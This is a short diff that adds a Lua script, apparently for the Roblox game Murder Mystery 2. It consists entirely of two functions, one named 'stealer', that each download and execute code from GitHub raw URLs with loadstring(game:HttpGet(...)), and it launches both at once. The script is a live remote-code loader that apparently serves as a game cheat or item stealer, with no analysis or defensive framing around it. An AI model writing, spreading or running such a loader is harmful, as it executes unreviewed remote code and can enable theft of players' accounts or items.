@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/SonicTheHeroe17/Mm2/refs/heads/main/Mm2'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/SonicTheHeroe17/Mm2/refs/heads/main/Generador%20de%20aemas'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
